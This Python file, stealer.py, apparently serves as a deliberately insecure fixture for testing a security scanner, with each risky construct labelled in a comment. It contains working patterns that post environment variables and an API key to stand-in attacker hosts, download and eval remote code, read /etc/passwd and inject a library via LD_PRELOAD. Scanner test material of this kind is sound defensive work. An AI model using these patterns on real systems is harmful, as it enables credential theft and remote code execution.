#!/usr/bin/env python3
"""
stealer.py — experimental script (do not run in production)

This file contains insecure constructs used for internal testing of the security scanner.
It demonstrates data exfiltration, shell execution, obfuscation, and remote fetch-and-execute flows.
"""

import os
import sys
import base64
import logging
import subprocess
import requests
import urllib.request
from urllib.request import urlopen

logging.basicConfig(level=logging.INFO)

def dump_environment():
    # Telemetry leak: logs environment variables and sensitive values
    print("ENVIRONMENT DUMP:", os.environ)  # Logs environment variables
    print("token", os.getenv("OPENAI_API_KEY"))  # Logs sensitive values (token)
    config = {"auth_token": os.getenv("OPENAI_API_KEY"), "endpoint": "http://malicious.example.com/api"}
    logging.info("Config: %s", config)  # Logs configuration data

def exfiltrate_data(payload: str):
    # Non-HTTPS exfiltration; direct IP used
    url = "http://exfil.bad/collect"  # Non-HTTPS URL found
    backup = "http://192.168.0.55/ingest"  # Direct IP address URL
    # Data exfiltration via POST
    r = requests.post(url, data={"data": payload, "env": dict(os.environ)})  # requests.post external
    # Additional shell POST using curl (unsafe)
    subprocess.run("curl -X POST http://malicious.example.com/log -d 'x=y'", shell=True)  # shell=True in subprocess — RCE risk
    return r.status_code

def run_shell_commands():
    # Shell command execution
    subprocess.run("id && uname -a", shell=True)  # shell=True in subprocess
    os.system("wget http://malicious.example.com/payload.sh")  # Shell command execution (os.system)

    # Make file executable (binary asset risk)
    cmd = "chmod +x /usr/local/bin/hook"  # Makes file executable
    subprocess.call(cmd, shell=True)

def obfuscated_exec():
    # Obfuscated payload decoded then executed dynamically
    payload_b64 = b"ZXZhbChwcmludCgiYmFkIHBheWxvYWQgaW4gYmFzZTY0Iikp"  # base64 string
    decoded = base64.b64decode(payload_b64)  # base64.b64decode
    eval(decoded.decode("utf-8"))  # Dynamic code execution (eval)

def fetch_and_execute_remote():
    # Fetch-and-execute pattern from remote URL (non-HTTPS)
    code = urllib.request.urlopen("http://malicious.example.com/payload.py").read().decode("utf-8")  # urlopen remote
    eval(code)  # Fetches and executes remote code (eval(urlopen(...)))

def path_traversal_and_system_read():
    # Path traversal via os.path.join
    base_dir = "/tmp/runtime"
    secret_path = os.path.join(base_dir, "..", "..", "secrets", "creds.txt")  # Path traversal via os.path.join
    # Read system files
    try:
        with open("/etc/passwd", "r") as f:  # Reads system files
            data = f.read()
    except Exception:
        data = ""
    return secret_path, data

def compiled_asset_marker():
    # Presence of compiled/opaque artifact reference
    cache_file = "module.pyc"  # Contains compiled code — cannot audit
    return cache_file

def inject_library():
    # Library injection via environment
    os.environ["LD_PRELOAD"] = "/usr/lib/libhax.so"  # Library injection via environment

def main():
    dump_environment()
    exfiltrate_data("test-payload")
    run_shell_commands()
    obfuscated_exec()
    fetch_and_execute_remote()
    secret_path, etc_passwd = path_traversal_and_system_read()
    logging.info("Secret path candidate: %s", secret_path)
    cache_file = compiled_asset_marker()
    logging.info("Cache file: %s", cache_file)
    inject_library()
    print("Done.")

if __name__ == "__main__":
    main()